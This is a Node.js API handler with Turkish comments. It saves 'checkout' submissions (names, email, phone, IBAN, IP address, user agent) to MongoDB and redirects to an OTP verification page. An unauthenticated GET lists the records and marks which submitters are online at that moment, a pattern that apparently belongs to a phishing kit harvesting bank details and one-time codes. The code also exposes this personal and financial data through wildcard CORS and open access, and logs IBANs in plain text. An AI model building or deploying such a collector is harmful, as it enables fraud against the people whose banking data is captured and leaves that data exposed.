// Checkout API - Checkout verilerini MongoDB'ye kaydeder
const { connectToDatabase } = require('../mardinlee/api/lib/mongodb');
const { ObjectId } = require('mongodb');

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Content-Type', 'application/json');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    const { db } = await connectToDatabase();
    const checkoutsCol = db.collection('checkouts');

    // Checkout verisi kaydetme
    if (req.method === 'POST') {
      console.log('📥 POST isteği geldi');
      console.log('📦 Body:', req.body);
      
      const { email, firstname, lastname, phone, iban, total } = req.body || {};
      
      // IP adresini al
      const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                 req.headers['x-real-ip'] || 
                 req.connection?.remoteAddress || 
                 'unknown';
      
      const checkoutData = {
        email: email || '',
        firstname: firstname || '',
        lastname: lastname || '',
        phone: phone || '',
        iban: iban || '',
        total: parseFloat(total) || 0,
        ip: ip,
        userAgent: req.headers['user-agent'] || '',
        createdAt: new Date()
      };

      console.log('💾 Kaydedilecek veri:', checkoutData);
      
      const result = await checkoutsCol.insertOne(checkoutData);
      console.log('✅ Veri kaydedildi, ID:', result.insertedId);
      
      return res.status(200).json({ 
        success: true,
        message: 'Checkout verisi kaydedildi',
        id: result.insertedId
      });
    }

    // Checkout verilerini getir veya redirect
    if (req.method === 'GET') {
      // Redirect işlemi için
      if (req.query.redirect === 'true' && req.query.id) {
        let checkoutId = req.query.id;
        try {
          // Try to convert to ObjectId if it's a valid hex string
          if (ObjectId.isValid(checkoutId)) {
            checkoutId = new ObjectId(checkoutId);
          }
        } catch (e) {
          // If conversion fails, use as string
        }
        
        const checkout = await checkoutsCol.findOne({ _id: checkoutId });
        if (!checkout) {
          return res.status(404).json({ error: 'Checkout bulunamadı' });
        }
        const redirectUrl = `/otp-verify.html?id=${req.query.id}`;
        res.writeHead(302, { Location: redirectUrl });
        return res.end();
      }

      // Normal GET - checkout listesi
      const checkouts = await checkoutsCol
        .find({})
        .sort({ createdAt: -1 })
        .limit(100)
        .toArray();

      // Online kullanıcı kontrolü için userSessions collection'ını kontrol et
      const userSessionsCol = db.collection('userSessions');
      const now = new Date();
      const sevenSecondsAgo = new Date(now.getTime() - 7 * 1000);
      
      // Online IP'leri al
      const onlineSessions = await userSessionsCol.find({
        $or: [
          { lastResponseAt: { $gte: sevenSecondsAgo } },
          { 
            $and: [
              { lastResponseAt: { $exists: false } },
              { lastSeen: { $gte: sevenSecondsAgo } }
            ]
          }
        ]
      }).toArray();
      
      const onlineIPs = new Set(onlineSessions.map(s => s.ip));
      
      // Checkout verilerine online bilgisini ekle
      const checkoutsWithOnline = checkouts.map(checkout => ({
        ...checkout,
        isOnline: checkout.ip && onlineIPs.has(checkout.ip)
      }));

      return res.status(200).json(checkoutsWithOnline);
    }

    return res.status(405).json({ error: 'Method not allowed' });
  } catch (error) {
    console.error('❌ Checkout API error:', error);
    console.error('❌ Error stack:', error.stack);
    return res.status(500).json({
      error: 'Veritabanı hatası',
      message: error.message
    });
  }
};

